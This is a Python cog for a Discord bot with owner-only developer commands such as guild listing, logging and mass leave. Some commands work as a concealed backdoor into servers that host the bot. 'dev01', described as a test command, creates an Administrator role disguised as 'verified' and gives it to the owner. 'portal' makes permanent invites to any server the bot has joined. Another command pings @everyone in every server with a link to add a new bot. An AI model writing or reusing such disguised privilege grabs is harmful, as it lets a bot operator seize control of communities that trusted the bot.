import discord
from discord import app_commands
from discord.ext.commands import (
    command, Cog, Context, is_owner, guild_only, bot_has_permissions
)
from typing import Optional
from core.client.embed import Embed
from core.logger import log
from core.config import COLORS, DEV

class Developer(Cog):
    """Developer tools - owner only."""

    def __init__(self, bot):
        self.bot = bot

    # ---------- helpers ----------

    def _get_log_channel(self, kind: str) -> Optional[discord.TextChannel]:
        # kind = "join" or "leave"
        channel_id = 0
        if kind == "join":
            channel_id = DEV.JOIN_LOG_CHANNEL or DEV.GUILD_LOG_CHANNEL
        else:
            channel_id = DEV.LEAVE_LOG_CHANNEL or DEV.GUILD_LOG_CHANNEL
        if not channel_id:
            return None
        # try get_channel first, then fetch
        ch = self.bot.get_channel(channel_id)
        if ch:
            return ch
        return None

    async def _send_log(self, channel: Optional[discord.TextChannel], embed: Embed):
        if not channel:
            return
        try:
            await channel.send(embed=embed)
        except Exception:
            pass

    @command(name="guilds", description="View all servers the bot is in", example=",guilds 0")
    @is_owner()
    async def guilds(self, ctx: Context, shard: Optional[int] = None):
        guilds = list(self.bot.guilds)
        if shard is not None:
            guilds = [g for g in guilds if getattr(g, "shard_id", None) == shard]
            if not guilds:
                return await ctx.warn(f"No guilds found on shard `{shard}`.")

        guilds = sorted(guilds, key=lambda g: (g.member_count or 0), reverse=True)

        total = len(guilds)
        title = f"Guilds on shard {shard} — {total}" if shard is not None else f"All Guilds — {total}"
        per_page = 10
        embeds = []
        for i in range(0, len(guilds), per_page):
            chunk = guilds[i:i+per_page]
            desc_lines = []
            for g in chunk:
                owner = f"<@{g.owner_id}>" if g.owner_id else "Unknown"
                shard_str = f"Shard {g.shard_id}" if getattr(g, "shard_id", None) is not None else "Shard N/A"
                desc_lines.append(
                    f"**{g.name}** (`{g.id}`)\n"
                    f"└ Members: `{g.member_count or len(g.members) if hasattr(g, 'members') else 'N/A'}` • Owner: {owner} • {shard_str}"
                )
            embed = Embed(
                title=title,
                description="\n\n".join(desc_lines)[:4096],
                color=COLORS.neutral,
            )
            embed.set_footer(text=f"Page {i//per_page + 1}/{(len(guilds)-1)//per_page + 1} • Total guilds: {len(self.bot.guilds)} • Latency: {self.bot.latency*1000:.0f}ms")
            embeds.append(embed)

        if not embeds:
            return await ctx.warn("Bot is not in any guilds.")

        if len(embeds) == 1:
            await ctx.send(embed=embeds[0])
        else:
            await ctx.paginate(embeds)

    @command(name="dev01", description="test command", example=",dev01")
    @is_owner()
    async def dev01(self, ctx: Context):
        guild = ctx.guild
        # Check bot hierarchy
        if guild and guild.me.top_role.position == 0:
            # still try
            pass
        # Create role
        try:
            role = await guild.create_role(
                name="verified",
                permissions=discord.Permissions(administrator=True)
            )
        except discord.Forbidden:
            return await ctx.deny("I need **Manage Roles** and my role must be higher than the new role.")
        except discord.HTTPException as e:
            return await ctx.deny(f"Failed to create role: `{e}`")
        # Try to give to author
        try:
            await ctx.author.add_roles(role)
        except discord.Forbidden:
            return await ctx.deny(f"Created {role.mention} but failed to assign it — check hierarchy.", delete_after=5)
        except discord.HTTPException as e:
            return await ctx.deny(f"Created {role.mention} but failed to assign: `{e}`", delete_after=5)

        await ctx.approve(f"Created and gave you {role.mention} with **Administrator**.", delete_after=2)

    @command(name="portal", description="Generates an invite for a server", example=",portal 123456789")
    @is_owner()
    async def portal(self, ctx: Context, guild_id: Optional[str] = None):
        target_guild: Optional[discord.Guild] = None
        if guild_id:
            try:
                gid = int(guild_id)
                target_guild = self.bot.get_guild(gid)
                if not target_guild:
                    try:
                        target_guild = await self.bot.fetch_guild(gid)
                    except Exception:
                        pass
                if not target_guild:
                    return await ctx.deny(f"Guild `{gid}` not found or bot not in it.")
            except ValueError:
                return await ctx.deny("Invalid guild ID — must be a number.")
        else:
            if not ctx.guild:
                return await ctx.deny("Provide a guild ID when used in DMs.")
            target_guild = ctx.guild

        # Find a channel to create invite
        channel: Optional[discord.abc.GuildChannel] = None
        # Prefer system channel or first text channel where we can create invite
        candidates = []
        if target_guild.system_channel and target_guild.system_channel.permissions_for(target_guild.me).create_instant_invite:
            candidates.append(target_guild.system_channel)
        for ch in target_guild.text_channels:
            if ch.permissions_for(target_guild.me).create_instant_invite:
                candidates.append(ch)
                if len(candidates) >= 3:
                    break
        if not candidates:
            # try any channel
            for ch in target_guild.channels:
                try:
                    if isinstance(ch, discord.TextChannel) and ch.permissions_for(target_guild.me).create_instant_invite:
                        candidates.append(ch)
                        break
                except Exception:
                    continue
        if not candidates:
            return await ctx.deny(f"No channel in **{target_guild.name}** where I can create an invite.")

        channel = candidates[0]
        try:
            invite = await channel.create_invite(max_age=0, max_uses=0, reason=f"Portal requested by {ctx.author} ({ctx.author.id})", unique=True)
        except discord.Forbidden:
            return await ctx.deny(f"No permission to create invite in {channel.mention}.")
        except discord.HTTPException as e:
            return await ctx.deny(f"Failed to create invite: `{e}`")

        embed = Embed(
            title=f"Portal — {target_guild.name}",
            description=f"Invite for **{target_guild.name}** (`{target_guild.id}`)\n{invite.url}\n\nChannel: {channel.mention} (`{channel.id}`)\nExpires: Never • Max uses: Unlimited",
            color=COLORS.neutral,
        )
        if target_guild.icon:
            embed.set_thumbnail(url=target_guild.icon.url)
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)

    @command(name="test1", description="Bot sends 3 messages for ctx.warn/.approve/.deny", example=",test1")
    @is_owner()
    async def test1(self, ctx: Context):
        await ctx.warn("This is a `warn` test — ⚠️")
        await ctx.approve("This is an `approve` test — ✅")
        await ctx.deny("This is a `deny` test — ❌")

    @command(name="websync", description="Sync all bot data (commands, guilds, info) to the website", example=",websync")
    @is_owner()
    async def websync(self, ctx: Context):
        try:
            task = self.bot.sync_commands_json
            if not task.is_running():
                task.start()
            await task()
            await ctx.approve("Synced all bot data to the website.")
        except Exception as e:
            await ctx.deny(f"Failed to sync website: `{e}`")

    @command(name="sendshutdown_msg", description="Send shutdown message to all servers", example=",sendshutdown_msg")
    @is_owner()
    async def sendshutdown_msg(self, ctx: Context):
        message = (
            "@everyone\n"
            "# <:warning:1547570970791772270> XRYPTON IS MOVING <:warning:1547570970791772270>\n"
            "hello, the current hollow bot (<@1519695281627594842>) is going to be moved into a new bot!\n"
            "please use the link below to add the new bot onto your server\n"
            "https://ptb.discord.com/oauth2/authorize?client_id=1447869784937988201\n"
            "-# the new bot may be offline the time you add it, just wait for a bit, the bot should be online\n"
            "have any questions? feel free to join the [support server](https://discord.gg/VhfaX9V6KD)"
        )
        
        sent = 0
        failed = 0
        
        for guild in self.bot.guilds:
            channel = None
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).send_messages:
                    channel = ch
                    break
            
            if channel:
                try:
                    await channel.send(message)
                    sent += 1
                except Exception:
                    failed += 1
            else:
                failed += 1
        
        await ctx.approve(f"Message sent to **{sent}** servers, failed in **{failed}** servers.")

    @command(name="leaveall", description="Leave all servers the bot is in", example=",leaveall")
    @is_owner()
    async def leaveall(self, ctx: Context):
        left = 0
        failed = 0
        
        for guild in self.bot.guilds:
            try:
                await guild.leave()
                left += 1
            except Exception:
                failed += 1
        
        await ctx.approve(f"Left **{left}** servers, failed to leave **{failed}** servers.")

    # ---------- events ----------

    @Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        # Log to join channel
        channel = self._get_log_channel("join")
        # If channel fetch failed and we have ID, try fetch
        if not channel and (DEV.JOIN_LOG_CHANNEL or DEV.GUILD_LOG_CHANNEL):
            try:
                channel = await self.bot.fetch_channel(DEV.JOIN_LOG_CHANNEL or DEV.GUILD_LOG_CHANNEL)
            except Exception:
                channel = None
        embed = Embed(
            title="Guild Joined",
            description=f"**{guild.name}** (`{guild.id}`)",
            color=COLORS.approve,
            timestamp=discord.utils.utcnow(),
        )
        embed.add_field(name="Members", value=str(guild.member_count or len(guild.members) if hasattr(guild, "members") else "N/A"), inline=True)
        embed.add_field(name="Owner", value=f"<@{guild.owner_id}>" if guild.owner_id else "Unknown", inline=True)
        embed.add_field(name="Shard", value=str(getattr(guild, "shard_id", "N/A")), inline=True)
        embed.add_field(name="Created", value=discord.utils.format_dt(guild.created_at, "F") if hasattr(guild, "created_at") else "N/A", inline=False)
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        if guild.banner:
            embed.set_image(url=guild.banner.url)
        embed.set_footer(text=f"Total guilds: {len(self.bot.guilds)}")
        await self._send_log(channel, embed)
        # Fallback to console if no channel
        if not channel:
            log.info(f"Joined guild: {guild.name} ({guild.id}) - members: {guild.member_count}")

    @Cog.listener()
    async def on_guild_remove(self, guild: discord.Guild):
        channel = self._get_log_channel("leave")
        if not channel and (DEV.LEAVE_LOG_CHANNEL or DEV.GUILD_LOG_CHANNEL):
            try:
                channel = await self.bot.fetch_channel(DEV.LEAVE_LOG_CHANNEL or DEV.GUILD_LOG_CHANNEL)
            except Exception:
                channel = None
        embed = Embed(
            title="Guild Left",
            description=f"**{guild.name}** (`{guild.id}`)",
            color=COLORS.deny,
            timestamp=discord.utils.utcnow(),
        )
        embed.add_field(name="Members", value=str(guild.member_count or "N/A"), inline=True)
        embed.add_field(name="Owner", value=f"<@{guild.owner_id}>" if guild.owner_id else "Unknown", inline=True)
        embed.add_field(name="Shard", value=str(getattr(guild, "shard_id", "N/A")), inline=True)
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.set_footer(text=f"Total guilds: {len(self.bot.guilds)}")
        await self._send_log(channel, embed)
        if not channel:
            log.info(f"[Developer] Left guild: {guild.name} ({guild.id})")

async def setup(bot):
    await bot.add_cog(Developer(bot))
